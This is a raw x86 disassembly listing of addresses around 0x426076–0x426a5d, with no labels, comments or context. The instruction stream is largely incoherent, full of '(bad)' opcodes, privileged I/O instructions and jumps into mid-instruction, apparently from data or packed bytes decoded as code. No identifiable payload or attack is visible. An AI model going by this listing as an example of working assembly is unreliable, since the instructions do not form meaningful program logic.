  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	or     al,0x28
  426082:	imul   eax,DWORD PTR [edi-0x20],0xffffff95
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	pop    ebp
  42608d:	fcomp  QWORD PTR [edi+0x74]
  426090:	fnsave [edx+ebx*2-0x46]
  426094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426095:	(bad)  
  426096:	test   eax,0x9f85c5d6
  42609b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42609c:	outs   dx,DWORD PTR ds:[esi]
  42609d:	pop    eax
  42609e:	pop    esi
  42609f:	xchg   DWORD PTR [esi+0x9],esi
  4260a2:	xchg   ebp,eax
  4260a3:	shl    DWORD PTR [ebp+0x7e9ba45c],cl
  4260a9:	mov    al,0x5c
  4260ab:	test   BYTE PTR [ebx+0x49500db1],dh
  4260b1:	jne    0x4260de
  4260b3:	jl     0x4260bb
  4260b5:	mov    dl,0x61
  4260b7:	bound  eax,QWORD PTR [ebx+ebx*8-0x4c]
  4260bb:	int    0x1f
  4260bd:	xlat   BYTE PTR ds:[ebx]
  4260be:	scas   al,BYTE PTR es:[edi]
  4260bf:	cwde   
  4260c0:	inc    esp
  4260c1:	adc    DWORD PTR [ebx+0x17],edi
  4260c4:	pop    esi
  4260c5:	in     al,dx
  4260c6:	out    dx,al
  4260c7:	aad    0xfc
  4260c9:	int3   
  4260ca:	sub    DWORD PTR [ebx-0x3f],eax
  4260cd:	xchg   ecx,eax
  4260ce:	sbb    BYTE PTR [esi],0x63
  4260d1:	adc    ch,bl
  4260d3:	mov    ebx,0xd803c2b8
  4260d8:	adc    edi,DWORD PTR [edx+0x2e]
  4260db:	jle    0x426112
  4260dd:	dec    edi
  4260de:	pushf  
  4260df:	iret   
  4260e0:	xlat   BYTE PTR ds:[ebx]
  4260e1:	jbe    0x4260b3
  4260e3:	and    al,0x29
  4260e5:	nop
  4260e6:	jmp    0x4260af
  4260e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e9:	cmp    al,0x38
  4260eb:	repz cmp dh,BYTE PTR [ebx+0x18d8b020]
  4260f2:	call   0xcbf6948
  4260f7:	jmp    0x8e49e379
  4260fc:	or     BYTE PTR [esi],bl
  4260fe:	jns    0x4260eb
  426100:	popa   
  426101:	mov    al,ds:0x98ac1673
  426106:	xor    ebp,DWORD PTR [edi]
  426108:	mov    ah,0x14
  42610a:	push   eax
  42610b:	outs   dx,BYTE PTR ds:[esi]
  42610c:	fist   WORD PTR [edx-0x36]
  42610f:	fistp  WORD PTR [esi+0x2919dfe8]
  426115:	pop    esp
  426116:	fnstsw WORD PTR [eax-0x25]
  426119:	jg     0x4260a1
  42611b:	sub    edx,DWORD PTR [edi-0x6f]
  42611e:	xor    al,0xc0
  426120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426121:	and    eax,0x367263e4
  426126:	fist   WORD PTR [eax+0x65cda86]
  42612c:	add    eax,0xbd91bf89
  426131:	mov    BYTE PTR [esi+ebp*2+0x29],dl
  426135:	inc    esp
  426136:	scas   al,BYTE PTR es:[edi]
  426137:	push   esi
  426138:	pop    ebx
  426139:	test   al,0x47
  42613b:	pop    ds
  42613c:	jge    0x42619d
  42613e:	inc    ebx
  42613f:	jns    0x42618e
  426141:	jge    0x42613a
  426143:	mov    ah,BYTE PTR [ebp-0x640e0cfd]
  426149:	sub    ah,BYTE PTR [ebp+eiz*1+0x5dd0cf4f]
  426150:	jp     0x4260e4
  426152:	test   eax,0x987d2928
  426157:	shr    BYTE PTR [eax],1
  426159:	sbb    BYTE PTR [ecx+0x62],0x1d
  42615d:	mov    DWORD PTR [ebx-0x3cfffc16],esi
  426163:	mov    eax,0x52103deb
  426168:	popa   
  426169:	jl     0x42610e
  42616b:	loopne 0x426123
  42616d:	lea    ebp,[esi]
  42616f:	push   esp
  426170:	scas   al,BYTE PTR es:[edi]
  426171:	cmp    ecx,eax
  426173:	push   0xc6ce59cb
  426178:	(bad)  
  42617a:	add    eax,0xfc9fd4e3
  42617f:	push   ebp
  426180:	(bad)  
  426181:	xchg   esp,eax
  426182:	sub    al,0xf
  426184:	sahf   
  426185:	hlt    
  426186:	mul    DWORD PTR [edi]
  426188:	cmp    BYTE PTR [edi+0x44406bfd],dl
  42618e:	call   0x426274
	...
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	and    eax,0xe452f0dd
  426205:	xchg   esi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	mov    edi,DWORD PTR [edi]
  42620e:	pop    es
  42620f:	ficom  WORD PTR [eax+0x239f6aa4]
  426215:	repnz and dl,BYTE PTR ds:0xcb6ebc75
  42621c:	push   ebp
  42621d:	jno    0x4261dc
  42621f:	adc    al,0x32
  426221:	xlat   BYTE PTR ds:[ebx]
  426222:	or     eax,edi
  426224:	mov    ds:0x683f9e0a,al
  426229:	inc    eax
  42622a:	rol    BYTE PTR [ebx+0x53b64f23],cl
  426230:	or     ecx,DWORD PTR [edx]
  426232:	pop    ds
  426233:	dec    dh
  426235:	cmc    
  426236:	sbb    ebp,DWORD PTR [ebx-0x11440b30]
  42623c:	daa    
  42623d:	fwait
  42623e:	nop
  42623f:	mov    esi,0xed2dcf34
  426244:	or     al,0x81
  426246:	rol    BYTE PTR [eax-0x8],0x80
  42624a:	push   ecx
  42624b:	clc    
  42624c:	mov    ds:0x64c00dc0,al
  426251:	mov    ch,0x18
  426253:	mov    ds:0x6a46405d,eax
  426258:	mov    ebx,0x2456a502
  42625d:	pop    ecx
  42625e:	in     eax,dx
  42625f:	dec    ecx
  426260:	les    ebx,FWORD PTR ds:0xf5acadf1
  426266:	cmp    al,0xde
  426268:	lods   al,BYTE PTR ds:[esi]
  426269:	and    ah,bh
  42626b:	inc    esi
  42626c:	mov    al,0x31
  42626e:	cld    
  42626f:	sbb    eax,0xe5909b91
  426274:	mov    gs,WORD PTR [eax]
  426276:	ficom  DWORD PTR [eax-0x4e]
  426279:	dec    esp
  42627a:	pop    ebp
  42627b:	and    DWORD PTR [ebp+eiz*1-0x3d1f2aef],ebx
  426282:	cmp    al,0xef
  426284:	cs push es
  426286:	int    0x92
  426288:	sub    esi,ebp
  42628a:	outs   dx,BYTE PTR ds:[esi]
  42628b:	push   ebp
  42628c:	aad    0xf6
  42628e:	not    BYTE PTR [ecx+0x3c901d6a]
  426294:	inc    eax
  426295:	inc    edi
  426296:	add    esi,ebx
  426298:	mov    ebx,0x8256c7f9
  42629d:	inc    ebx
  42629e:	jae    0x42628a
  4262a0:	hlt    
  4262a1:	mov    edi,0xe726dc66
  4262a6:	cmp    DWORD PTR [edi+0x6bec2217],ebx
  4262ac:	add    DWORD PTR [ebp-0x57],eax
  4262af:	ins    DWORD PTR es:[edi],dx
  4262b0:	outs   dx,BYTE PTR ds:[esi]
  4262b1:	or     esi,DWORD PTR [edx+0x76e2fb5a]
  4262b7:	ds pop edi
  4262b9:	clc    
  4262ba:	pop    esi
  4262bb:	jge    0x42628b
  4262bd:	leave  
  4262be:	push   esp
  4262bf:	das    
  4262c0:	dec    esp
  4262c1:	xchg   ebx,eax
  4262c2:	jecxz  0x4262d6
  4262c4:	mov    esp,0xd7571926
  4262c9:	xlat   BYTE PTR ds:[ebx]
  4262ca:	add    edi,ebp
  4262cc:	stos   BYTE PTR es:[edi],al
  4262cd:	jo     0x4262d1
  4262cf:	test   DWORD PTR [ebp-0x5ec17a0d],ecx
  4262d5:	cwde   
  4262d6:	ja     0x426276
  4262d8:	sbb    al,0xab
  4262da:	retf   0xf2ac
  4262dd:	iret   
  4262de:	or     ebx,ebx
  4262e0:	(bad)  
  4262e1:	pop    eax
  4262e2:	hlt    
  4262e3:	adc    DWORD PTR [esi+0x403622e2],eax
  4262e9:	sub    BYTE PTR [ebp-0x2],0x7d
  4262ed:	lea    ebx,[edi+esi*4]
  4262f0:	loope  0x4262b9
  4262f2:	push   ebp
  4262f3:	fiadd  DWORD PTR [edi+0x7c]
  4262f6:	sbb    al,BYTE PTR [edx-0x36]
  4262f9:	das    
  4262fa:	sbb    ecx,ebp
  4262fc:	pop    ebx
  4262fd:	push   eax
  4262fe:	test   eax,0xa6eaf660
  426303:	pop    ss
  426304:	arpl   WORD PTR [edi],cx
  426306:	addr16 dec ebx
  426308:	add    dh,bl
  42630a:	iret   
  42630b:	or     DWORD PTR [ebx+0x4],esp
  42630e:	add    eax,0x3
	...
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x443950de
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    BYTE PTR [edx+0x352dd338],cl
  426391:	cmp    edx,eax
  426393:	addr16 jns 0x4263d8
  426396:	xchg   edx,eax
  426397:	(bad)  
  426398:	cmp    BYTE PTR ds:0xa4c73fce,bh
  42639e:	sahf   
  42639f:	ja     0x426378
  4263a1:	fs das 
  4263a3:	popa   
  4263a4:	ror    eax,1
  4263a6:	dec    ebp
  4263a7:	mov    bh,0xab
  4263a9:	pushf  
  4263aa:	aam    0xc7
  4263ac:	sbb    eax,0x5362a36b
  4263b1:	test   al,0x1e
  4263b3:	dec    eax
  4263b4:	jp     0x4263aa
  4263b6:	jb     0x4263cc
  4263b8:	ss std 
  4263ba:	int    0x69
  4263bc:	mov    eax,0x28230b46
  4263c1:	xor    ch,BYTE PTR [ecx]
  4263c3:	mov    WORD PTR [ebp+ebp*8-0x60f5a494],es
  4263ca:	test   eax,0xe51a388
  4263cf:	pop    esp
  4263d0:	cmc    
  4263d1:	sbb    eax,0x4b4c15db
  4263d6:	pop    esi
  4263d7:	cdq    
  4263d8:	mov    edx,0xfbe8eb3b
  4263dd:	sbb    BYTE PTR [edx],bh
  4263df:	popa   
  4263e0:	push   edi
  4263e1:	pop    esp
  4263e2:	icebp  
  4263e3:	repnz das 
  4263e5:	and    al,0xeb
  4263e7:	rcr    BYTE PTR [esi],cl
  4263e9:	mov    ecx,0x47546971
  4263ee:	xchg   ebx,eax
  4263ef:	dec    esp
  4263f0:	call   0xe2dad4f8
  4263f5:	daa    
  4263f6:	pop    esi
  4263f7:	neg    DWORD PTR [edx]
  4263f9:	cmp    BYTE PTR [esi],bh
  4263fb:	sbb    DWORD PTR [ebx+0x5a],ebp
  4263fe:	inc    eax
  4263ff:	(bad)  
  426400:	loop   0x4263ef
  426402:	lods   eax,DWORD PTR ds:[esi]
  426403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426404:	mov    edx,0xa9902616
  426409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42640a:	mov    dl,0xb0
  42640c:	pop    esp
  42640d:	cmp    dl,BYTE PTR [edx+edi*4+0x58]
  426411:	inc    ecx
  426412:	aas    
  426413:	mov    esp,0x8c3017b3
  426418:	jno    0x4263c7
  42641a:	mov    edi,?
  42641c:	call   0x4bd639d8
  426421:	shl    BYTE PTR [ebx-0x5f],1
  426424:	repnz pop ds
  426426:	jnp    0x42641f
  426428:	cmp    BYTE PTR [ecx+0x56],bh
  42642b:	mov    bh,0xe0
  42642d:	adc    ah,bh
  42642f:	call   FWORD PTR [edi]
  426431:	call   0x6b95:0xa5a5ef38
  426438:	push   0xffffffb6
  42643a:	push   edi
  42643b:	iret   
  42643c:	jp     0x426427
  42643e:	pop    es
  42643f:	pop    ecx
  426440:	into   
  426441:	ja     0x426439
  426443:	test   al,0xb6
  426445:	sti    
  426446:	xor    dh,cl
  426448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426449:	sub    cl,bh
  42644b:	jp     0x42641e
  42644d:	xchg   ecx,eax
  42644e:	mov    ch,bl
  426450:	arpl   WORD PTR [ecx+0x51762290],di
  426456:	adc    DWORD PTR [edx-0x48],edi
  426459:	stos   DWORD PTR es:[edi],eax
  42645a:	xor    al,0x2
  42645c:	cmp    ebx,esp
  42645e:	push   cs
  42645f:	cmp    esi,DWORD PTR [ebp-0x33]
  426462:	call   0xb2a0:0xe658cace
  426469:	retf   0x62c5
  42646c:	and    dl,BYTE PTR es:0xfe88b356
  426473:	mov    al,0x82
  426475:	pop    ss
  426476:	xor    al,0xc9
  426478:	dec    eax
  426479:	dec    eax
  42647a:	push   esi
  42647b:	jl     0x426416
  42647d:	jecxz  0x426409
  42647f:	in     al,0x58
  426481:	xchg   ebx,eax
  426482:	lock loop 0x42649b
  426485:	test   DWORD PTR [ebp+eiz*1-0x47],0x37bb4162
  42648d:	sbb    cl,BYTE PTR [ebx+0xe4]
	...
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   esp,ebx
  426501:	push   es
  426502:	dec    edi
  426503:	sub    ebp,esp
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	pusha  
  42650d:	cmp    al,BYTE PTR [esi+0x20]
  426510:	push   ecx
  426511:	adc    ah,BYTE PTR [edi]
  426513:	mov    DWORD PTR [ebp+0x6b1bd184],esp
  426519:	fwait
  42651a:	jmp    0x42655e
  42651c:	repnz sbb edx,DWORD PTR [ecx-0x7a]
  426520:	adc    ebx,edx
  426522:	sbb    bh,0x56
  426525:	dec    ecx
  426526:	sub    cl,BYTE PTR [edi-0x6a]
  426529:	mov    ecx,0x4b94bb17
  42652e:	(bad)  
  42652f:	lock ds jle 0x42654b
  426533:	lock sbb bl,0x6d
  426537:	mov    ds:0x9bb3e7a6,eax
  42653c:	(bad)  
  42653d:	retf   0x1a9f
  426540:	push   ebp
  426541:	jp     0x426559
  426543:	iret   
  426544:	jbe    0x426503
  426546:	sbb    eax,0xd001770f
  42654b:	repnz (bad) 
  42654d:	jo     0x4265b3
  42654f:	xor    BYTE PTR [esi+0xe],ch
  426552:	adc    al,0xb6
  426554:	inc    esi
  426555:	js     0x426508
  426557:	sub    eax,0x9ba067c3
  42655c:	cld    
  42655d:	pop    esp
  42655e:	or     dh,BYTE PTR [eax]
  426560:	push   0xd499a589
  426565:	adc    DWORD PTR [ebx],esp
  426567:	nop
  426568:	jne    0x42656e
  42656a:	cmc    
  42656b:	mov    eax,0x8fa49267
  426570:	xchg   ecx,eax
  426571:	sbb    al,0xab
  426573:	or     ecx,DWORD PTR [ebx]
  426575:	(bad)
  426578:	adc    eax,0x33f78faf
  42657d:	dec    esi
  42657e:	mov    BYTE PTR [edx],ah
  426580:	loopne 0x4265d9
  426582:	and    al,0x4b
  426585:	fsub   st(2),st
  426587:	pop    ss
  426588:	or     al,0x64
  42658a:	and    ch,ch
  42658c:	sbb    BYTE PTR [ecx-0x5d],cl
  42658f:	ret    0x6da3
  426592:	(bad)  [ecx-0x72d86321]
  426598:	xor    esp,DWORD PTR [edx-0x60]
  42659b:	jl     0x426554
  42659d:	sub    cl,BYTE PTR [edi-0x67b08d02]
  4265a3:	xchg   edx,eax
  4265a4:	dec    edi
  4265a5:	pusha  
  4265a6:	bound  edi,QWORD PTR [ebx+0x21]
  4265a9:	and    eax,0xe422e857
  4265ae:	jg     0x426539
  4265b0:	mov    ah,0x65
  4265b2:	dec    esp
  4265b3:	std    
  4265b4:	jmp    0x64d0:0x4fc07104
  4265bb:	xchg   edi,eax
  4265bc:	scas   al,BYTE PTR es:[edi]
  4265bd:	lods   al,BYTE PTR ds:[esi]
  4265be:	fiadd  DWORD PTR ds:0xafa085d7
  4265c4:	sub    eax,0xbbbea8d5
  4265c9:	sbb    eax,0xaecdc41b
  4265ce:	mov    cl,0x47
  4265d0:	jne    0x42657b
  4265d2:	push   edx
  4265d3:	pop    eax
  4265d4:	sbb    edi,edi
  4265d6:	(bad)  ds:0xf4da6c3d
  4265dc:	mov    eax,ds:0xbb3c66a2
  4265e1:	(bad)  
  4265e2:	out    dx,eax
  4265e3:	inc    esi
  4265e4:	xchg   edi,eax
  4265e5:	sbb    ah,al
  4265e7:	xor    DWORD PTR [esi+ecx*4-0x50],ecx
  4265eb:	ss push edx
  4265ed:	or     ah,dl
  4265ef:	xlat   BYTE PTR ds:[ebx]
  4265f0:	jb     0x4265ac
  4265f2:	jne    0x4265cf
  4265f4:	inc    ebx
  4265f5:	call   0xaa6b:0x12033a0b
  4265fc:	and    eax,0xfd955924
  426601:	sahf   
  426602:	std    
  426603:	or     esp,DWORD PTR [esi+0x7feab43b]
  426609:	(bad)  
  42660a:	pop    ds
  42660b:	inc    ebx
  42660c:	adc    dh,BYTE PTR [edx+ecx*2]
  42660f:	rol    DWORD PTR [eax],cl
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x25ab925c]
  426682:	sbb    esi,DWORD PTR [eax-0x10]
  426685:	cdq    
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	and    esi,DWORD PTR [edx+0x32e163de]
  426692:	and    ch,dh
  426694:	shl    esp,0xb4
  426697:	xchg   ebp,eax
  426698:	(bad)  
  426699:	sahf   
  42669a:	ds aam 0xc
  42669d:	fs dec edi
  42669f:	adc    al,BYTE PTR [esp]
  4266a2:	daa    
  4266a3:	push   ecx
  4266a4:	pop    es
  4266a5:	sti    
  4266a6:	or     ecx,DWORD PTR [ebx+0x55]
  4266a9:	cmc    
  4266aa:	push   0x72e5bbeb
  4266af:	mov    al,0xf0
  4266b1:	cmp    BYTE PTR [edi],0xad
  4266b4:	test   BYTE PTR [ebx+0x7a],dl
  4266b7:	push   ds
  4266b8:	jmp    0xa73c:0x24e66354
  4266bf:	xor    eax,0x1d208f95
  4266c4:	xor    DWORD PTR [eax-0x1b15b31e],0xc
  4266cb:	mov    dh,0x46
  4266cd:	ja     0x4266b2
  4266cf:	outs   dx,BYTE PTR ds:[esi]
  4266d0:	and    bl,BYTE PTR [edx-0x6f2d056b]
  4266d6:	in     al,0xee
  4266d8:	stos   DWORD PTR es:[edi],eax
  4266d9:	mov    DWORD PTR [esi],edi
  4266db:	jno    0x426684
  4266dd:	fwait
  4266de:	adc    al,0xf3
  4266e0:	in     eax,dx
  4266e1:	pop    ss
  4266e2:	out    0xcd,eax
  4266e4:	ja     0x426678
  4266e6:	inc    bx
  4266e8:	je     0x4266eb
  4266ea:	jae    0x42675d
  4266ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266ed:	push   es
  4266ee:	int3   
  4266ef:	enter  0xb56c,0x7f
  4266f3:	loope  0x4266ed
  4266f5:	sbb    BYTE PTR [ebx-0x10],0xd
  4266f9:	daa    
  4266fa:	idiv   BYTE PTR [ecx]
  4266fc:	cmp    BYTE PTR [ecx+0x7b],0x54
  426700:	imul   eax,DWORD PTR [ecx],0x2e
  426703:	pop    ebx
  426704:	popf   
  426705:	into   
  426706:	hlt    
  426707:	out    dx,eax
  426708:	jae    0x4266d6
  42670a:	std    
  42670b:	imul   esi,DWORD PTR [ecx+0x70e14dec],0x6b
  426712:	and    DWORD PTR [ecx+0x50d05a8c],eax
  426718:	and    eax,0x5764e68f
  42671d:	and    eax,0x5d6ede92
  426722:	dec    esp
  426723:	sbb    ecx,DWORD PTR [edi+0x4e3ba3cd]
  426729:	lea    eax,[esi+0x73]
  42672c:	inc    esi
  42672d:	dec    eax
  42672e:	lods   al,BYTE PTR ds:[esi]
  42672f:	das    
  426730:	adc    ebx,eax
  426732:	add    DWORD PTR [ebx+0x30f60afa],0x9ddb98ac
  42673c:	lahf   
  42673d:	cmp    ebp,DWORD PTR [eax-0x15]
  426740:	mov    esp,0x3ffe67e3
  426745:	repz jb 0x4266c8
  426748:	mov    ecx,DWORD PTR [ebx-0x74]
  42674b:	ror    BYTE PTR [ecx],0x41
  42674e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42674f:	int    0x8
  426751:	pop    ecx
  426752:	out    0x9a,al
  426754:	sub    al,0x79
  426756:	pop    ss
  426757:	xor    BYTE PTR [esi-0x5e],cl
  42675a:	jns    0x426706
  42675c:	dec    ecx
  42675d:	sbb    BYTE PTR [ecx-0x1ed0500f],al
  426763:	mov    edx,0xda56b842
  426768:	and    al,ch
  42676a:	xchg   edx,ebx
  42676c:	into   
  42676d:	ret    0x5d3e
  426770:	cmp    eax,DWORD PTR [ebx]
  426772:	cmp    BYTE PTR [ecx],bh
  426774:	and    eax,0x4c9b8bc2
  426779:	outs   dx,BYTE PTR ds:[esi]
  42677a:	mov    ebx,ebx
  42677c:	push   esp
  42677d:	rol    DWORD PTR [ebp+0x7f],0x6
  426781:	and    edx,ecx
  426783:	sti    
  426784:	or     eax,0xe9806913
  426789:	call   FWORD PTR [esi]
  42678b:	dec    eax
  42678c:	test   DWORD PTR [ebx+0x488],edx
	...
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	ret    
  426801:	jp     0x4267be
  426803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426804:	hlt    
  426805:	call   0x0:0x1040001
  42680c:	int3   
  42680d:	aaa    
  42680e:	imul   ecx,DWORD PTR [ebp+0x68],0x59
  426812:	push   es
  426813:	pop    edx
  426814:	adc    BYTE PTR [ebx-0x45],0x2b
  426818:	mov    ch,0xe1
  42681a:	cwde   
  42681b:	fs in  al,0xce
  42681e:	in     al,dx
  42681f:	pop    eax
  426820:	xor    DWORD PTR [ebx+0x64f6fd3a],eax
  426826:	mov    al,ds:0x98b9489
  42682b:	sub    eax,0x20042eb0
  426830:	dec    ebp
  426831:	sar    BYTE PTR [ecx+edx*2],0x30
  426835:	sub    dh,0x6b
  426838:	scas   eax,DWORD PTR es:[edi]
  426839:	sbb    BYTE PTR [ebx],dl
  42683b:	inc    edx
  42683c:	out    0xa0,al
  42683e:	and    BYTE PTR [eax-0x7],dh
  426841:	mov    edi,0xf1c1465c
  426846:	fiadd  DWORD PTR [ebx]
  426848:	inc    ecx
  426849:	push   ebp
  42684a:	or     esp,DWORD PTR [edi+edi*8]
  42684d:	int    0xd1
  42684f:	push   edi
  426850:	(bad)  
  426851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426852:	clc    
  426853:	jmp    0x42689b
  426855:	enter  0x6a1f,0xfb
  426859:	or     DWORD PTR [ebx-0x14744d7a],ecx
  42685f:	add    eax,0x70367663
  426864:	in     eax,dx
  426865:	inc    eax
  426866:	mul    DWORD PTR [esp+eax*8+0x309b201e]
  42686d:	sbb    DWORD PTR [edx],0x1d82b583
  426873:	and    cl,BYTE PTR [eax]
  426875:	ret    
  426876:	lds    edi,FWORD PTR [ecx+0x61]
  426879:	addr16 mov ah,0xf7
  42687c:	and    al,0xfa
  42687e:	popa   
  42687f:	mov    dl,0x75
  426881:	push   cs
  426882:	into   
  426883:	inc    esi
  426884:	idiv   BYTE PTR [esp+ebx*2-0x64d1b0e1]
  42688b:	inc    ecx
  42688c:	xchg   BYTE PTR [edx+0x2e],bl
  42688f:	je     0x426861
  426891:	xor    al,0x43
  426893:	mov    eax,0xd6851bc
  426898:	mov    al,0x33
  42689a:	outs   dx,DWORD PTR ds:[esi]
  42689b:	and    al,0xed
  42689d:	fidivr WORD PTR [eax-0x33]
  4268a0:	lea    ebp,[ebp-0x22]
  4268a3:	dec    esp
  4268a4:	sbb    eax,0xd337752a
  4268a9:	xchg   BYTE PTR [eax+0x2cc0119],bl
  4268af:	mov    eax,ds:0xbc88f958
  4268b4:	fs and al,0xc3
  4268b7:	jp     0x4268a5
  4268b9:	push   esp
  4268ba:	(bad)  
  4268bb:	cmp    dh,BYTE PTR [esi+0x6bbe298e]
  4268c1:	add    al,0x49
  4268c3:	ins    BYTE PTR es:[edi],dx
  4268c4:	icebp  
  4268c5:	dec    eax
  4268c6:	pop    esi
  4268c7:	enter  0xe96b,0xbc
  4268cb:	dec    ebx
  4268cc:	ds jo  0x42685b
  4268cf:	ret    
  4268d0:	push   ss
  4268d1:	ror    DWORD PTR [ebp-0x3ce6e31e],1
  4268d7:	leave  
  4268d8:	es jae 0x426915
  4268db:	sbb    al,0x6f
  4268dd:	(bad)  
  4268de:	aas    
  4268df:	popa   
  4268e0:	sbb    eax,DWORD PTR [ecx+0x7deabf4e]
  4268e6:	inc    edx
  4268e7:	mov    DWORD PTR [esi-0x63],edi
  4268ea:	mov    ds:0xdd6bfdd4,eax
  4268ef:	outs   dx,DWORD PTR ds:[esi]
  4268f0:	pusha  
  4268f1:	(bad)  
  4268f2:	or     BYTE PTR [ebp-0x115193c1],al
  4268f8:	cmp    esi,DWORD PTR [esp+ecx*8-0x63]
  4268fc:	pop    edx
  4268fd:	aam    0xda
  4268ff:	sbb    eax,0x3fd5c6e2
  426904:	setle  BYTE PTR [bx+si+0x77b7]
  42690a:	je     0x42694b
  42690c:	inc    ebp
  42690d:	scas   eax,DWORD PTR es:[edi]
  42690e:	push   ebx
  42690f:	loopne 0x426911
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    ebx,DWORD PTR [edi]
  426981:	sbb    cl,BYTE PTR [edx+0x46]
  426984:	clc    
  426985:	fwait
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	and    ebx,DWORD PTR [esp+eiz*8+0x215f5398]
  426993:	pop    edx
  426994:	adc    eax,0x9bbcc974
  426999:	rcr    DWORD PTR [ebp+0x1b6d0518],0xd8
  4269a0:	push   cs
  4269a1:	in     eax,dx
  4269a2:	cmp    al,0x0
  4269a4:	jmp    0x7890a8bb
  4269a9:	push   esi
  4269aa:	cmovle di,cx
  4269ae:	loope  0x426a2f
  4269b0:	pop    esi
  4269b1:	cmp    DWORD PTR [ebx],edi
  4269b3:	invd   
  4269b5:	sbb    eax,0xee5586d8
  4269ba:	mov    eax,ds:0xe2c0367
  4269bf:	sub    DWORD PTR [eax-0x43],esp
  4269c2:	js     0x42696c
  4269c4:	out    dx,eax
  4269c5:	enter  0x5e7b,0x6d
  4269c9:	pop    esp
  4269ca:	mov    gs,ebp
  4269cc:	out    0xa2,al
  4269ce:	push   ebp
  4269cf:	out    0xbc,eax
  4269d1:	cmc    
  4269d2:	xor    al,0x15
  4269d4:	mov    WORD PTR [eax+0x3],?
  4269d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269d8:	int3   
  4269d9:	pop    ecx
  4269da:	adc    ebx,DWORD PTR [edx+0x1b0aeed2]
  4269e0:	cmp    al,0x4f
  4269e2:	and    DWORD PTR [edx+eiz*4-0x4],0x22
  4269e7:	rcr    dl,cl
  4269e9:	jl     0x426974
  4269eb:	jns    0x426981
  4269ed:	and    ah,al
  4269ef:	jae    0x426a3c
  4269f1:	dec    edi
  4269f2:	xchg   edx,eax
  4269f3:	and    al,0x63
  4269f5:	sbb    al,0x8b
  4269f7:	pushf  
  4269f8:	jne    0x426a47
  4269fa:	daa    
  4269fb:	push   ecx
  4269fc:	cwde   
  4269fd:	jo     0x426a6a
  4269ff:	xchg   esi,eax
  426a00:	pop    edi
  426a01:	cmp    eax,0xc888632b
  426a06:	push   ecx
  426a07:	xchg   esi,eax
  426a08:	fbstp  TBYTE PTR [eax]
  426a0a:	mov    eax,ds:0x9121bc56
  426a0f:	popa   
  426a10:	jg     0x4269aa
  426a12:	cs dec esi
  426a14:	aas    
  426a15:	pop    edi
  426a16:	sub    cl,BYTE PTR [ecx+0xe6f667d]
  426a1c:	test   DWORD PTR [edx+0x5c],ebx
  426a1f:	daa    
  426a20:	(bad)  
  426a21:	pop    ss
  426a22:	(bad)  
  426a23:	ins    DWORD PTR es:[edi],dx
  426a24:	pop    ebx
  426a25:	pop    ebx
  426a26:	(bad)  
  426a27:	dec    edx
  426a28:	sub    esp,esi
  426a2a:	mov    eax,0x55b4438
  426a2f:	dec    edi
  426a30:	lahf   
  426a31:	call   0x3f4:0x4f2b7b20
  426a38:	js     0x426a80
  426a3a:	out    0x51,eax
  426a3c:	ins    BYTE PTR es:[edi],dx
  426a3d:	or     DWORD PTR [ebx],ecx
  426a3f:	pop    ebx
  426a40:	adc    eax,0x198faad0
  426a45:	adc    al,0xc9
  426a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a48:	ins    BYTE PTR es:[edi],dx
  426a49:	(bad)  
  426a4a:	imul   ebp,ebp,0xffffff92
  426a4d:	call   0x955cee40
  426a52:	inc    edx
  426a53:	pop    ss
  426a54:	outs   dx,BYTE PTR ds:[esi]
  426a55:	icebp  
  426a56:	aaa    
  426a57:	jo     0x426a26
  426a59:	jo     0x426aa2
  426a5b:	popa   
  426a5c:	dec    esi
  426a5d:	jae    0x426a34
